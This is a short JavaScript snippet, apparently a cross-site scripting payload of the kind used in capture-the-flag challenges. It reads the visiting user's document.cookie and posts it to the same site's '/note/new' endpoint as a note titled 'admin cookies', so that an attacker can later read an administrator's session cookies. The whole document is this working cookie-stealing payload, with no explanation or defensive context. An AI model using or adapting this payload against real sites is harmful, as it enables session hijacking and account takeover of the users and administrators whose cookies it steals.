const data = new FormData()
data.append("title", "admin cookies")
data.append("content", document.cookie)
data.append("submit", "save")

fetch("/note/new", {
  method: "POST",
  body: data,
})
